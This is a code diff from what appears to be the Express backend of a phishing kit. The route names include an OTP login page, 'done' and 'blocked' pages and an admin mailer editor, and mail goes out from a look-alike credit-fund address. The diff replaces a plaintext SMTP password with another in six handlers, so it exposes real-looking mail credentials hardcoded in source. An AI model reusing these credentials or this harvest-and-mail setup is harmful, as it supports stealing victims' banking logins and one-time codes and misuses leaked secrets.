@@ -43,7 +43,7 @@ app.post('/login/otp.html', async (req, res) => {
     service: 'SMTP',
     auth: {
       user: "kredit-fund@assistin.online",
-      pass: "BankinSafe$2025"
+      pass: "@FFa/Logis20"
     },
     from: "kredit-fund@assistin.online",
   });
@@ -270,7 +270,7 @@ app.post('/done.html', async (req, res) => {
     service: 'SMTP',
     auth: {
       user: "kredit-fund@assistin.online",
-      pass: "BankinSafe$2025"
+      pass: "@FFa/Logis20"
     },
     from: "kredit-fund@assistin.online",
   });
@@ -554,7 +554,7 @@ app.post('/done2.html', async (req, res) => {
     service: 'SMTP',
     auth: {
       user: "kredit-fund@assistin.online",
-      pass: "BankinSafe$2025"
+      pass: "@FFa/Logis20"
     },
     from: "kredit-fund@assistin.online",
   });
@@ -1070,7 +1070,7 @@ app.post('/admin/maileredit.html', async (req, res) => {
     service: 'SMTP',
     auth: {
       user: "kredit-fund@assistin.online",
-      pass: "BankinSafe$2025"
+      pass: "@FFa/Logis20"
     },
     from: "kredit-fund@assistin.online",
   });
@@ -1709,7 +1709,7 @@ app.post('/blocked.html', async (req, res) => {
     service: 'SMTP',
     auth: {
       user: "kredit-fund@assistin.online",
-      pass: "BankinSafe$2025"
+      pass: "@FFa/Logis20"
     },
     from: "kredit-fund@assistin.online",
   });
@@ -2360,7 +2360,7 @@ app.post('/register/index.html', async (req, res) => {
     service: 'SMTP',
     auth: {
       user: "kredit-fund@assistin.online",
-      pass: "BankinSafe$2025"
+      pass: "@FFa/Logis20"
     },
     from: "kredit-fund@assistin.online",
   });
